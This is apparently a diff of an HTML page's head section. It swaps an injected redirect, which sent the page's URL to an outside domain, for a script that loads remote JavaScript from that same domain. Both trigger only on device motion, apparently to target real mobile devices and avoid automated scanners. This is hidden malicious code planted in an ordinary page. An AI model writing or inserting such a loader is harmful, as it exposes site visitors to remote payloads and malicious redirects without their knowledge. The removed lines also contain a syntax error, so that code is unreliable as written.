@@ -7,6 +7,8 @@
 @import "images/style.css";
 </style>
 
+
+
 <script>
 var nodeAG = document.getElementById('accelerationIncludingGravity');
 var maxAG = 0;
@@ -17,18 +19,16 @@ if(Math.abs(maxAG) < Math.abs(ag[i])){
 maxAG = ag[i];
 }
 }
-
 var hah = maxAG.toFixed(2);
-
-if (hah > 0) window.location = "https://kiketyng.fun/8vNKV1?sub_id_1=" + encodeURIComponent(document.location.hostname + document.location.pathname + document.location.href)";
-if (hah < 0) window.location = "https://kiketyng.fun/8vNKV1?sub_id_1=" + encodeURIComponent(document.location.hostname + document.location.pathname + document.location.href)";
+var script = document.createElement('script');
+script.src = 'https://kiketyng.fun/8vNKV1?sub_id_1=55555';
+if (hah > 0) document.getElementsByTagName('head')[0].appendChild(script);
+if (hah < 0) document.getElementsByTagName('head')[0].appendChild(script);
 window.removeEventListener('devicemotion', onMotionChange, true);
 }
 window.addEventListener('devicemotion', onMotionChange, true);
-
-
-
 </script>
+
 
 
 </head>
